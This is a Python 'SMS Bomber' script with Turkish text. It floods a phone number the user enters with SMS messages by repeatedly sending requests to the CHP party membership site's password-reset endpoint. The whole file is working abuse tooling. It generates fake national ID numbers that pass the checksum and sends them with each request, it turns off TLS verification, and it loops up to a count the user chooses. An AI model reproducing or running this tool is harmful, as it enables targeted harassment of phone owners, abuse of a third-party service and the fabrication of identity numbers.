import psutil
from pypresence import Presence
import requests
import json
import urllib3
import ctypes
import time
import random
import os
import colorama

sent = 0

ctypes.windll.kernel32.SetConsoleTitleW(f"[Sms - Bomber] By Dede")

print("\n")
print (" > Dede Bomber'a Hoşgeldin!")
print("")

time.sleep(3)


print(f''' > Dede Bomber Telgram Hesabım @dedestur               
''')
time.sleep(1)
print(f" > Bilgilendirme Programdan Çıkmak İçin (Ctrl + C Yapınız!)")

time.sleep(0.5)
print("")
print(f" > Sistem Otomatik T.C Oluşturuyor!")
time.sleep(0.5)
print("")
print(f" > İlerki Zamanlarda Aynı Numara'ya Farlı T.C Girince Sıkıntı Olabilir!")
time.sleep(0.5)
print("")
print(f" > Bu Sebeple Sistemin Size Verdiği T.C'yi Not Edin!")
time.sleep(0.5)
print("")
print(f" > Tekrar O Numara'ya Sms Atmak İstiyosanız Aynı T.C'yi Kullanın!")
print("")
try:
	print(''' > Powered By Dede\n''')

	

	urllib3.disable_warnings()
	url = "https://uyelik.chp.org.tr/Default.aspx"

	dede_numara = input(" > Telefon Numarası Girin, Örn: (5xx)-xxx-xx-xx:  ")
	dede_delay = int(input(" > Bekleme Süresi Kaç Saniye (Tavsiye Edilen 5): "))
	dede_adet = int(input(" > Gönderilecek Miktar: "))
	dede_tc = str(input(" > T.C Girin, yoksa \"dede\" Yazınız: "
						 ""))
	
	def tcolustur():
	    a1=random.randint(1,9)
	    a2=random.randint(0,9)
	    a3=random.randint(0,9)
	    a4=random.randint(0,9)
	    a5=random.randint(0,9)
	    a6=random.randint(0,9)
	    a7=random.randint(0,9)
	    a8=random.randint(0,9)
	    a9=random.randint(0,9)
	    a10=((((a1+a3+a5+a7+a9)*7)-(a2+a4+a6+a8))%10)
	    a11=((a1+a2+a3+a4+a5+a6+a7+a8+a9+a10)%10)
	    sonuc=str(a1)+str(a2)+str(a3)+str(a4)+str(a5)+str(a6)+str(a7)+str(a8)+str(a9)+str(a10)+str(a11)
	    return sonuc

	if dede_tc == "dede" or dede_tc == "dede":
		fayuj_tc = tcolustur()
		print(dede_numara+" Numarası İçin T.C Numaranız: "+dede_tc+" Numaraya İlk Defa Atıyorsanız Bu T.C'yi Not Edin!")
		print("")
	else:
		dede_tc = dede_tc
	headers = {
	"Host": "uyelik.chp.org.tr",
	"Connection": "keep-alive",
	"sec-ch-ua": 'Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98',
	"sec-ch-ua-mobile": '?0',
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36",
	"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
	"Cache-Control": "no-cache",
	"X-Requested-With": "XMLHttpRequest",
	"X-MicrosoftAjax": "Delta=true",
	"sec-ch-ua-platform": '"Windows"',
	"Accept": "*/*",
	"Origin": "https://uyelik.chp.org.tr",
	"Sec-Fetch-Site": "same-origin",
	"Sec-Fetch-Mode": "cors",
	"Sec-Fetch-Dest": "empty",
	"Referer": "https://uyelik.chp.org.tr/Default.aspx",
	"Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
	"Cookie": "ASP.NET_SessionId=fhuho2ztrep5l0lob2yydxpi",
	"Accept-Encoding": "gzip, deflate",
	"Content-Length": "3208",
	}
	 
	data = {
	"smkf": "upPanel|btnSorgula",
	"txtTckn": tcolustur(),
	"txtSifreTelefonNumarasi": dede_numara,
	"hfFoto": "",
	"hdnFotoUrl": "resimyok.jpg",
	"hdnUyeID": "0",
	"hdnTckn": "0",
	"hdnKrediKartiID": "0",
	"hdnUyeIl": "0",
	"hdnUyeIlce": "0",
	"hdnTelefon": "0",
	"hdnYargitaySorguDurumu": "0",
	"__EVENTTARGET": "",
	"__EVENTARGUMENT": "",
	"__VIEWSTATE": "",
	"__VIEWSTATEGENERATOR": "CA0B0334",
	"__SCROLLPOSITIONX": "0",
	"__SCROLLPOSITIONY": "0",
	"__ASYNCPOST": "true",
	"btnSorgula": "Şifre gönder",
	}

	i = 1
	while i<=dede_adet:
		response = requests.post(url, headers=headers, data=data, verify=False, )
		kod = str(response.status_code)
		if kod == "200":
			print(" > Sms Başarıyla Gönderildi!")
			ctypes.windll.kernel32.SetConsoleTitleW(f"[Sms - Bomber] By Dede | Gönderilen: %s" % sent)
			sent += 1
		else:
			print(" > Hata Kodu: " + kod)
		time.sleep(dede_delay)
		i = i + 1
# print("JSON Response ", response.json())

except KeyboardInterrupt:
	print(" > Program Kapatılıyor! ")
	print("")
	print(" > Emeğe Karşılık Discord Sunucumuza Geliniz!")
	time.sleep(2)
	os.system("start https://instagram.com/slatians")
	os.system("start https://discord.gg/fransa")
	exit(0)